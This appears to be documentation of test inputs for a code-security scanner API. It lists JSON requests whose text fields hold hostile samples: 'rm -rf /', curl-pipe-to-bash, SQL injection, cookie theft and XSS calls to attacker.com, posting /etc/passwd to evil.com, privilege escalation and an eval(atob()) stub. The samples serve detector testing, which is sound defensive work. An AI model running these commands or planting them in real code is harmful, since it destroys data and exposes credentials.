# Critical Threat Examples for CodeBERT Scanner

These are examples of malicious code that would be blocked as **Critical** severity by the CodeBERT scanner.

## 🚨 Critical Severity Examples

### 1. **System Command Execution**
```json
{
  "text": "exec('rm -rf /')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple system commands:**
```json
{
  "text": "exec('rm -rf /'); system('curl malicious-site.com | bash'); Process.Start('cmd.exe', '/c del C:\\*.*');",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 2. **Database Injection Attacks**
```json
{
  "text": "'; DROP TABLE users; --",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple SQL injection attacks:**
```json
{
  "text": "'; DELETE FROM users WHERE 1=1; --'; UPDATE users SET password='hacked'; --",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 3. **File System Attacks**
```json
{
  "text": "import os; os.system('rm -rf /home/*')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**File system destruction:**
```json
{
  "text": "open('/etc/passwd', 'w').write('hacked')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 4. **Network Attacks**
```json
{
  "text": "fetch('http://attacker.com/steal?data=' + document.cookie)",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple network attacks:**
```json
{
  "text": "XMLHttpRequest().open('POST', 'http://evil.com', true); fetch('http://attacker.com/steal?data=' + document.cookie)",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 5. **Authentication Bypass**
```json
{
  "text": "localStorage.setItem('admin', 'true')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple authentication bypass attempts:**
```json
{
  "text": "document.cookie = 'admin=true; path=/'; sessionStorage.setItem('authenticated', 'true'); localStorage.setItem('admin', 'true')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 6. **Code Injection**
```json
{
  "text": "eval('malicious_code_here')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple code injection attacks:**
```json
{
  "text": "Function('return ' + userInput)(); setTimeout('malicious_function()', 0); eval('malicious_code_here')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 7. **Cross-Site Scripting (XSS)**
```json
{
  "text": "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple XSS payloads:**
```json
{
  "text": "<img src=x onerror=alert('XSS')><iframe src=\"javascript:alert('XSS')\"></iframe><script>document.location='http://attacker.com/steal'</script>",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 8. **Privilege Escalation**
```json
{
  "text": "sudo su -",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple privilege escalation attempts:**
```json
{
  "text": "chmod 777 /etc/passwd; usermod -aG root attacker; sudo su -",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 9. **Data Exfiltration**
```json
{
  "text": "import requests; requests.post('http://attacker.com', data=open('/etc/passwd').read())",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple data exfiltration attempts:**
```json
{
  "text": "subprocess.run(['curl', '-X', 'POST', 'http://evil.com', '-d', sensitive_data]); requests.post('http://attacker.com', data=open('/etc/passwd').read())",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### 10. **Cryptocurrency Mining**
```json
{
  "text": "eval(atob('bWluaW5nX3NjcmlwdA=='))",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Multiple cryptocurrency mining attempts:**
```json
{
  "text": "new Worker('data:text/javascript,mining_code'); eval(atob('bWluaW5nX3NjcmlwdA=='))",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

## 🎯 Why These Are Critical

These examples trigger **Critical** severity because they:

1. **Direct System Access**: `exec()`, `system()`, `Process.Start()`
2. **Data Destruction**: `rm -rf`, `DROP TABLE`, file deletion
3. **Security Bypass**: Authentication, authorization bypass
4. **Data Exfiltration**: Sending sensitive data to external servers
5. **Code Injection**: `eval()`, `Function()`, dynamic execution
6. **Network Attacks**: Malicious requests, data theft
7. **Privilege Escalation**: Gaining unauthorized access levels

## 🧪 Ready-to-Use API Examples

### **Quick Test (Copy & Paste)**
```json
{
  "text": "exec('rm -rf /')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### **Multi-Threat Test**
```json
{
  "text": "exec('malicious'); eval('hack'); system('curl evil.com'); localStorage.setItem('admin', 'true')",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### **XSS Test**
```json
{
  "text": "<script>document.location='http://attacker.com/steal'</script>",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

### **SQL Injection Test**
```json
{
  "text": "'; DROP TABLE users; --",
  "scanners": ["codebert_security"],
  "options": { "threshold": 0.5 }
}
```

**Expected Response:**
```json
{
  "decision": 2,
  "score": 0.95,
  "highestSeverity": "Critical",
  "findings": [
    {
      "scanner": "codebert_security",
      "code": "DETECTED",
      "message": "Critical security threat detected",
      "severity": "Critical",
      "confidence": 0.95
    }
  ]
}
```

## 🛡️ Protection Levels

- **Critical (4)**: Immediate blocking - system destruction, data theft
- **High (3)**: Blocking - serious security threats
- **Medium (2)**: Blocking - suspicious activity
- **Low (1)**: Review - minor concerns
- **Info (0)**: Allow - no threats detected

These examples would all result in **decision = 2 (Block)** with **Critical** severity, providing maximum protection for your application.
